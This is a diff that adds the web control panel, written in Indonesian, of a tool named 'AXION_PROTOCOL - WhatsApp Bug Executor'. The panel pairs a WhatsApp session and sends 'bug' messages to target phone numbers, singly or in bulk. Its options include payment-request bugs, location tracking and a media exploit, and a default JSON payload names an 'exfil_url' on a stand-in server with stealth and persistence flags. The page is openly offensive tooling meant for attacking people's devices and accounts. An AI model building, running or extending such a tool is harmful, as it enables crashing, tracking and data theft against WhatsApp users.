@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>AXION_WA_BUG</title>
+    <script src="/socket.io/socket.io.js"></script>
+    <style>
+        body { font-family: monospace; background: #000; color: #0f0; margin: 20px; }
+        .container { max-width: 900px; margin: auto; }
+        .panel { border: 1px solid #0f0; padding: 15px; margin: 10px 0; }
+        .panel-title { color: #0ff; font-weight: bold; margin-bottom: 10px; }
+        .status-box { 
+            background: #111; 
+            border: 1px solid #333; 
+            padding: 10px; 
+            margin: 10px 0;
+            min-height: 20px;
+        }
+        #qrcode { margin: 20px auto; text-align: center; }
+        input, select, button { 
+            background: #111; 
+            color: #0f0; 
+            border: 1px solid #0f0; 
+            padding: 8px 12px;
+            margin: 5px;
+            width: 300px;
+        }
+        button { 
+            background: #003300; 
+            cursor: pointer;
+            width: auto;
+            min-width: 150px;
+        }
+        button:hover { background: #006600; }
+        button.danger { background: #330000; }
+        button.danger:hover { background: #660000; }
+        .input-group { margin: 10px 0; }
+        label { display: inline-block; width: 200px; }
+        .log-box { 
+            background: #111; 
+            border: 1px solid #0f0; 
+            padding: 10px; 
+            margin-top: 20px;
+            height: 200px;
+            overflow-y: auto;
+            font-size: 12px;
+        }
+        .log-entry { margin: 3px 0; }
+        .log-time { color: #888; }
+        .log-success { color: #0f0; }
+        .log-error { color: #f00; }
+        .log-warning { color: #ff0; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔧 AXION_PROTOCOL - WhatsApp Bug Executor</h1>
+        
+        <div class="panel">
+            <div class="panel-title">STATUS SISTEM</div>
+            <div class="status-box" id="status">
+                [AXION_PROTOCOL] Status: Menunggu inisialisasi...
+            </div>
+            <div class="status-box" id="socketStatus">
+                WebSocket: Tidak terhubung
+            </div>
+        </div>
+        
+        <div class="grid">
+            <!-- Panel Kiri: Pairing & Session -->
+            <div class="panel">
+                <div class="panel-title">📱 PAIRING & SESSION CONTROL</div>
+                
+                <div class="input-group">
+                    <label>Nomor Pairing (WA):</label><br>
+                    <input type="text" id="pairNumber" placeholder="628xxxxxxx (tanpa +)">
+                </div>
+                
+                <div class="input-group">
+                    <label>Metode Pairing:</label><br>
+                    <select id="pairMethod">
+                        <option value="qr">QR Code</option>
+                        <option value="code">Kode 6 Digit</option>
+                        <option value="link">Link Pairing</option>
+                    </select>
+                </div>
+                
+                <div class="input-group">
+                    <button onclick="initPairing()">🚀 Mulai Pairing</button>
+                    <button onclick="forceReconnect()" class="danger">♻️ Force Reconnect</button>
+                </div>
+                
+                <div id="pairingCode" style="display:none;">
+                    <div class="input-group">
+                        <label>Kode Verifikasi:</label><br>
+                        <input type="text" id="verifyCode" placeholder="XXXXXX">
+                        <button onclick="submitVerifyCode()">✓ Submit Kode</button>
+                    </div>
+                </div>
+                
+                <div id="qrcode"></div>
+                
+                <div class="input-group">
+                    <button onclick="checkConnection()">📡 Cek Status Koneksi</button>
+                    <button onclick="killSession()" class="danger">⏹️ Kill Session</button>
+                </div>
+            </div>
+            
+            <!-- Panel Kanan: Target & Eksekusi -->
+            <div class="panel">
+                <div class="panel-title">🎯 TARGET EXECUTION</div>
+                
+                <div class="input-group">
+                    <label>Target (JID/No HP):</label><br>
+                    <input type="text" id="target" placeholder="628xxxxxxx@s.whatsapp.net">
+                </div>
+                
+                <div class="input-group">
+                    <label>Tipe Pesan Bug:</label><br>
+                    <select id="bugType">
+                        <option value="fcInf1">FcInf1MSG (View Once Interactive)</option>
+                        <option value="callReq">Call Permission Request</option>
+                        <option value="payment">Payment Request Bug</option>
+                        <option value="location">Location Tracking</option>
+                        <option value="media">Media Exploit</option>
+                    </select>
+                </div>
+                
+                <div class="input-group">
+                    <label>Payload Custom (JSON):</label><br>
+                    <textarea id="customPayload" rows="4" style="width:100%;background:#111;color:#0f0;border:1px solid #0f0;">
+{
+  "exfil_url": "https://your-server.com/exfil",
+  "stealth": true,
+  "persistence": "session"
+}</textarea>
+                </div>
+                
+                <div class="input-group">
+                    <button onclick="sendPayload()">⚡ Kirim Bug ke Target</button>
+                    <button onclick="massSend()" class="danger">💥 Mass Send (10 Target)</button>
+                </div>
+                
+                <div class="input-group">
+                    <label>Target List (Multiple):</label><br>
+                    <textarea id="targetList" rows="3" style="width:100%;background:#111;color:#0f0;border:1px solid #0f0;" placeholder="Masukan target per baris:
+628xxxxxxxxx@s.whatsapp.net
+628xxxxxxxxx@s.whatsapp.net"></textarea>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Panel Log -->
+        <div class="panel">
+            <div class="panel-title">📊 SYSTEM LOG & MONITOR</div>
+            <div class="log-box" id="log">
+                <div class="log-entry"><span class="log-time">[00:00:00]</span> <span class="log-success">System initialized</span></div>
+                <div class="log-entry"><span class="log-time">[00:00:00]</span> Ready for commands</div>
+            </div>
+            
+            <div class="input-group">
+                <button onclick="clearLog()">🗑️ Clear Log</button>
+                <button onclick="exportLog()">📥 Export Log</button>
+                <button onclick="checkActiveSessions()">👥 Check Active Sessions</button>
+                <span style="float:right;color:#888;" id="connectionCount">Connected: 0</span>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        const socket = io();
+        let sessionActive = false;
+        
+        // Update status UI
+        function updateStatus(msg, type = 'info') {
+            const status = document.getElementById('status');
+            const time = new Date().toLocaleTimeString();
+            
+            status.innerHTML = `[AXION_PROTOCOL] ${msg}`;
+            
+            // Warna berdasarkan tipe
+            const colors = {
+                'info': '#0f0',
+                'error': '#f00',
+                'warning': '#ff0',
+                'success': '#0ff'
+            };
+            status.style.color = colors[type] || '#0f0';
+            
+            // Tambah ke log
+            addLog(msg, type);
+        }
+        
+        function updateSocketStatus(msg, connected = false) {
+            const elem = document.getElementById('socketStatus');
+            elem.innerHTML = `WebSocket: ${msg}`;
+            elem.style.color = connected ? '#0f0' : '#f00';
+        }
+        
+        function addLog(message, type = 'info') {
+            const logBox = document.getElementById('log');
+            const time = new Date().toLocaleTimeString();
+            
+            const typeClass = {
+                'info': '',
+                'error': 'log-error',
+                'warning': 'log-warning',
+                'success': 'log-success'
+            }[type];
+            
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            entry.innerHTML = `<span class="log-time">[${time}]</span> <span class="${typeClass}">${message}</span>`;
+            
+            logBox.appendChild(entry);
+            logBox.scrollTop = logBox.scrollHeight;
+        }
+        
+        // Fungsi Pairing
+        function initPairing() {
+            const pairNumber = document.getElementById('pairNumber').value;
+            const method = document.getElementById('pairMethod').value;
+            
+            if (!pairNumber || !pairNumber.match(/^[0-9]{10,15}$/)) {
+                updateStatus('Nomor pairing tidak valid', 'error');
+                return;
+            }
+            
+            updateStatus(`Memulai pairing dengan ${pairNumber}...`, 'info');
+            
+            socket.emit('start-pairing', {
+                number: pairNumber,
+                method: method
+            });
+        }
+        
+        function submitVerifyCode() {
+            const code = document.getElementById('verifyCode').value;
+            if (code.length === 6) {
+                socket.emit('verify-code', code);
+                updateStatus('Mengirim kode verifikasi...', 'info');
+            }
+        }
+        
+        // Fungsi Target
+        function sendPayload() {
+            const target = document.getElementById('target').value;
+            const bugType = document.getElementById('bugType').value;
+            const customPayload = document.getElementById('customPayload').value;
+            
+            if (!target) {
+                updateStatus('Target belum diisi', 'error');
+                return;
+            }
+            
+            updateStatus(`Mengirim bug ${bugType} ke ${target}...`, 'warning');
+            
+            fetch('/send-bug', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    target: target,
+                    bugType: bugType,
+                    customPayload: customPayload
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.success) {
+                    updateStatus(`Bug berhasil dikirim ke ${target}`, 'success');
+                } else {
+                    updateStatus(`Gagal: ${data.error}`, 'error');
+                }
+            })
+            .catch(err => {
+                updateStatus(`Error: ${err.message}`, 'error');
+            });
+        }
+        
+        function massSend() {
+            const targetList = document.getElementById('targetList').value.split('\n').filter(t => t.trim());
+            
+            if (targetList.length === 0) {
+                updateStatus('Target list kosong', 'error');
+                return;
+            }
+            
+            updateStatus(`Mengirim mass bug ke ${targetList.length} target...`, 'warning');
+            
+            fetch('/mass-bug', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    targets: targetList,
+                    bugType: document.getElementById('bugType').value
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                updateStatus(`Mass send selesai. Berhasil: ${data.success}, Gagal: ${data.failed}`, 'success');
+            });
+        }
+        
+        // Fungsi Utility
+        function checkConnection() {
+            socket.emit('check-connection');
+        }
+        
+        function forceReconnect() {
+            socket.emit('force-reconnect');
+            updateStatus('Memaksa reconnect...', 'warning');
+        }
+        
+        function killSession() {
+            socket.emit('kill-session');
+            updateStatus('Session dihentikan', 'error');
+        }
+        
+        function clearLog() {
+            document.getElementById('log').innerHTML = '';
+            addLog('Log cleared', 'info');
+        }
+        
+        function exportLog() {
+            const logContent = document.getElementById('log').innerText;
+            const blob = new Blob([logContent], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `axion-log-${Date.now()}.txt`;
+            a.click();
+            updateStatus('Log diexport', 'success');
+        }
+        
+        function checkActiveSessions() {
+            fetch('/active-sessions')
+                .then(res => res.json())
+                .then(data => {
+                    updateStatus(`Active sessions: ${data.count}`, 'info');
+                });
+        }
+        
+        // Socket Event Handlers
+        socket.on('connect', () => {
+            updateSocketStatus('Terhubung ke server', true);
+            updateStatus('WebSocket connected', 'success');
+        });
+        
+        socket.on('disconnect', () => {
+            updateSocketStatus('Terputus', false);
+            updateStatus('WebSocket disconnected', 'error');
+        });
+        
+        socket.on('qr', (qr) => {
+            document.getElementById('qrcode').innerHTML = 
+                `<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(qr)}">
+                 <p>Scan QR untuk pairing</p>`;
+            updateStatus('QR Code generated. Scan dengan WhatsApp', 'info');
+        });
+        
+        socket.on('connected', (data) => {
+            updateStatus(`TERHUBUNG ke WhatsApp: ${data.phone}`, 'success');
+            document.getElementById('pairNumber').value = data.phone.replace('@s.whatsapp.net', '');
+            sessionActive = true;
+        });
+        
+        socket.on('pairing-code', (code) => {
+            document.getElementById('pairingCode').style.display = 'block';
+            updateStatus(`Kode pairing: ${code}`, 'warning');
+        });
+        
+        socket.on('error', (err) => {
+            updateStatus(`ERROR: ${err}`, 'error');
+        });
+        
+        socket.on('connection-count', (count) => {
+            document.getElementById('connectionCount').innerText = `Connected: ${count}`;
+        });
+        
+        socket.on('bug-result', (data) => {
+            addLog(`Bug result: ${JSON.stringify(data)}`, data.success ? 'success' : 'error');
+        });
+        
+        // Auto-check connection setiap 30 detik
+        setInterval(checkConnection, 30000);
+        
+        // Initial log
+        updateStatus('AXION_PROTOCOL ready. Input pairing number dan target.', 'info');
+    </script>
+</body>
+</html>
